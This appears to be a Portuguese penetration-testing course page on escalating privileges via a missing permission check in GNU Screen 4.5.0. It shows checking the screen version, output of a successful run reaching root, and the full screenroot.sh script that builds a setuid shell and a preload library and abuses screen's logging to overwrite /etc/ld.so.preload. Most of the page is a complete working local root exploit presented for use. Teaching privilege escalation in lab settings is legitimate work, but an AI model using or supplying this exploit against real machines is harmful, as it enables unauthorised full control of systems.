Muitos serviços podem ser encontrados, os quais têm falhas que podem ser alavancadas para escalar privilégios. Um exemplo é o popular multiplexador de terminal [Screen](https://linux.die.net/man/1/screen) . A versão 4.5.0 sofre de uma vulnerabilidade de escalação de privilégios devido à falta de uma verificação de permissões ao abrir um arquivo de log.

#### Identificação da versão do screen
```shell-session
NycolasES6@htb[/htb]$ screen -v

Screen version 4.05.00 (GNU) 10-Dec-16
```

Isso permite que um invasor trunque qualquer arquivo ou crie um arquivo de propriedade do root em qualquer diretório e, por fim, obtenha acesso root total.

#### Escalação de privilégios - Screen_Exploit.sh
```shell-session
NycolasES6@htb[/htb]$ ./screen_exploit.sh 

~ gnu/screenroot ~
[+] First, we create our shell and library...
[+] Now we create our /etc/ld.so.preload file...
[+] Triggering...
' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
[+] done!
No Sockets found in /run/screen/S-mrb3n.

# id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare),1000(mrb3n)
```

O script abaixo pode ser usado para executar esse ataque de escalonamento de privilégios:
```sh
#!/bin/bash
# screenroot.sh
# setuid screen v4.5.0 local root exploit
# abuses ld.so.preload overwriting to get root.
# bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html
# HACK THE PLANET
# ~ infodox (25/1/2017)
echo "~ gnu/screenroot ~"
echo "[+] First, we create our shell and library..."
cat << EOF > /tmp/libhax.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
EOF
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
rm -f /tmp/libhax.c
cat << EOF > /tmp/rootshell.c
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
EOF
gcc -o /tmp/rootshell /tmp/rootshell.c -Wno-implicit-function-declaration
rm -f /tmp/rootshell.c
echo "[+] Now we create our /etc/ld.so.preload file..."
cd /etc
umask 000 # because
screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" # newline needed
echo "[+] Triggering..."
screen -ls # screen itself is setuid, so...
/tmp/rootshell
```

